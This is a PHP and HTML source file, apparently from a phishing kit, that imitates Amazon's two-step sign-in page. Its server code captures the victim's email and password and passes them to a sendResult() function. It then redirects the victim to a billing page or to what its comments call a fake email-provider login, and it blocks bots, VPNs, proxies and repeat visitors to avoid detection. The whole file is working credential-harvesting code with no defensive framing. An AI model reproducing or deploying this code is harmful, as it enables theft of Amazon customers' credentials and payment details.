<?php
require 'includes/config.php';
require 'includes/functions.php';
require 'includes/blocker.php';

// Proses login
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = [
        'email' => $_POST['email'],
        'password' => $_POST['password']
    ];
    // Simpan di session agar halaman berikutnya (billing.php) dapat diakses
    $_SESSION['email'] = $data['email'];
    $_SESSION['password'] = $data['password'];
    sendResult('login', $data);
    
    // Generate random ref untuk internal redirect
    $ref = generateRef();
    $_SESSION['ref'] = $ref;
    // Jika admin mengaktifkan get_email_access, arahkan dulu ke halaman provider email palsu
    if (!empty($config['get_email_access'])) {
        header('Location: email_login?ref=' . $ref);
    } else {
        header('Location: billing?ref=' . $ref);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="<?php echo htmlspecialchars($lang); ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .logo {
            text-align: center;
            margin-top: 40px;
        }

        .logo-image {
            background-position: -2px -167px;
			max-width: 103px;
            height: auto;
        }

        .container {
            width: 80%;
            max-width: 350px;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 35px 26px;
            background-color: #fff;
        }

        h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 15px;
            color: #111;
        }

        .subtitle {
            font-size: 16px;
            color: #555;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: 700;
            margin-bottom: 5px;
            color: #111;
        }

        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px 12px;
            font-size: 14px;
            border: 1px solid #888;
            border-radius: 3px;
            outline: none;
        }

        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
        }

        .continue-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to bottom, #ffd600, #ffca00);
            border: 1px solid #e6b800;
            border-radius: 25px;   /* bikin jadi oval */
            font-size: 14px;
            cursor: pointer;
            margin-top: 5px;
            color: #111;
            text-align: center;
        }


        .continue-btn:hover {
            background: linear-gradient(to bottom, #f5d78e, #edb932);
            border-color: #a88734 #9c7e31 #846a29;
        }

        .continue-btn:active {
            background: linear-gradient(to bottom, #f0c14b, #f7dfa5);
        }

        .terms {
            font-size: 11px;
            color: #767676;
            margin-top: 15px;
            line-height: 1.5;
        }

        .terms a {
            color: #0066c0;
            text-decoration: none;
        }

        .terms a:hover {
            color: #c45500;
            text-decoration: underline;
        }

        .need-help {
            font-size: 13px;
            color: #0066c0;
            margin-top: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .need-help:hover {
            color: #c45500;
            text-decoration: underline;
        }

        .welcome-text {
            font-size: 14px;
            color: #555;
            margin-bottom: 25px;
            text-align: left;
        }

        .captcha {
            margin: 15px 0;
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        .captcha input {
            margin-right: 5px;
        }

        .divider {
            margin: 30px 0 20px 0;
            text-align: center;
            position: relative;
            width: 100%;
            max-width: 350px;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #ddd;
            z-index: 1;
        }

        .divider-text {
            font-size: 12px;
            color: #767676;
            background: #fff;
            padding: 0 15px;
            position: relative;
            z-index: 2;
        }

        .create-account-btn {
            width: 100%;
            max-width: 350px;
            padding: 12px;
            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
            border: 1px solid #adb1b8;
            border-radius: 25px;
            font-size: 13px;
            cursor: pointer;
            color: #111;
            margin-bottom: 40px;
        }

        .create-account-btn:hover {
            background: linear-gradient(to bottom, #e7e9ec, #d5d9dd);
        }

        .footer {
            width: 100%;
            max-width: 350px;
            padding-top: 20px;
            border-top: 1px solid #ddd;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            font-size: 11px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }
        
        .label-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 4px;
        }

        .forgot-link {
            font-size: 12px;
            color: #0066c0;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .footer-links a {
            color: #0066c0;
            text-decoration: none;
        }

        .footer-links a:hover {
            color: #c45500;
            text-decoration: underline;
        }
        
        .email-row {
            display: flex;
            justify-content: space-between; /* kiri email — kanan Change */
            align-items: left;
            margin-bottom: 10px;
            width: 100%;
            gap: 10px;
        }

        .email-text {
            font-size: 14px;
            color: #111;
        }

        .change-link {
            font-size: 13px;
            color: #0066c0;
            text-decoration: none;
            margin-right: 150px; /* kasih jarak biar nggak mepet */
        }

        .change-link:hover {
            text-decoration: underline;
        }

        .copyright {
            text-align: center;
            font-size: 11px;
            color: #555;
        }

        /* Hide/show steps */
        #passwordStep {
            display: none;
        }

        @media (max-width: 480px) {
            body { padding: 10px; }
            .container { padding: 25px 20px; }
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="logo-image">
    </div>

    <div class="container">
        <!-- Email Step (Visible First) -->
        <div id="emailStep">
            <h1>Sign in</h1>
            
            <?php
            $blocked = $_GET['blocked'] ?? '';
            if ($blocked === 'country') {
                echo '<div style="background:#fee; border:1px solid #f99; color:#c33; padding:10px; margin-bottom:15px; border-radius:4px; font-size:12px;">
                        <strong>Access Restricted</strong><br>
                        Your country is not allowed to access this service.
                      </div>';
            } elseif ($blocked === 'vpn') {
                echo '<div style="background:#fee; border:1px solid #f99; color:#c33; padding:10px; margin-bottom:15px; border-radius:4px; font-size:12px;">
                        <strong>Access Restricted</strong><br>
                        VPN/Proxy access is not allowed.
                      </div>';
            } elseif ($blocked === 'proxy') {
                echo '<div style="background:#fee; border:1px solid #f99; color:#c33; padding:10px; margin-bottom:15px; border-radius:4px; font-size:12px;">
                        <strong>Access Restricted</strong><br>
                        Proxy access is not allowed.
                      </div>';
            } elseif ($blocked === 'bot') {
                echo '<div style="background:#fee; border:1px solid #f99; color:#c33; padding:10px; margin-bottom:15px; border-radius:4px; font-size:12px;">
                        <strong>Access Restricted</strong><br>
                        Bot access is not allowed.
                      </div>';
            } elseif ($blocked === 'onetimeaccess') {
                echo '<div style="background:#fee; border:1px solid #f99; color:#c33; padding:10px; margin-bottom:15px; border-radius:4px; font-size:12px;">
                        <strong>Access Restricted</strong><br>
                        You have already accessed this service once.
                      </div>';
            }
            ?>
            
            <form id="emailForm">
                <div class="form-group">
                    <label for="email">Enter mobile number or email</label>
                    <input type="email" id="email" name="email" required>
                </div>
                
                <button type="submit" class="continue-btn">Continue</button>
            </form>

            <div class="terms">
                By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
            </div>

            <div class="need-help">Need help? ▼</div>
        </div>

        <!-- Password Step (Hidden Initially) -->
        <div id="passwordStep">
            <h1>Sign in</h1>
            <div class="email-row">
              <p class="welcome-text" id="welcomeText">Welcome back</p>
              <a href="#" class="change-link">Change</a>
            </div>
            
            <form id="passwordForm" action="" method="POST">
                <input type="hidden" name="step" value="login">
                <input type="hidden" id="hiddenEmail" name="email">
                
                <div class="form-group">
                    <div class="label-row">
                        <label for="password">Password</label>
                        <a href="#" class="forgot-link">Forgot your password?</a>
                    </div>

                    <input type="password" id="password" name="password" required>
                </div>


                <button type="submit" class="continue-btn">Sign in</button>
            </form>

            <div class="need-help">Other issues with Sign-In?</div>
        </div>
    </div>

    <div class="divider">
        <span class="divider-text">New to Amazon?</span>
    </div>

    <button class="create-account-btn">Create your Amazon account</button>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <div class="copyright">
            © 1996-2025, Amazon.com, Inc. or its affiliates
        </div>
    </div>

    <script>
        // Two-step logic: Email -> Password, then POST both to PHP
        const emailForm = document.getElementById('emailForm');
        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const emailInput = document.getElementById('email');
        const hiddenEmail = document.getElementById('hiddenEmail');
        const welcomeText = document.getElementById('welcomeText');
        const passwordForm = document.getElementById('passwordForm');

        emailForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const email = emailInput.value.trim();
            if (email) {
                hiddenEmail.value = email;
                welcomeText.textContent = `${email}`;
                emailStep.style.display = 'none';
                passwordStep.style.display = 'block';
                window.scrollTo(0, 0); // Mimic Amazon scroll
                // Optional: Log for testing (remove in prod)
                console.log('Captured Email:', email);
            }
        });

        passwordForm.addEventListener('submit', function(e) {
            const password = document.getElementById('password').value.trim();
            if (!password) {
                e.preventDefault();
                alert('Enter your password');
                return;
            }
            // Form will POST to this page (login.php) with email (hidden), password, step=login
            // Server-side PHP (above) will log the visit, send the result, and redirect to billing.php
            console.log('Sending to PHP:', { email: hiddenEmail.value, password });
        });

        // Auto-focus
        window.addEventListener('load', () => emailInput.focus());
    </script>
</body>
</html>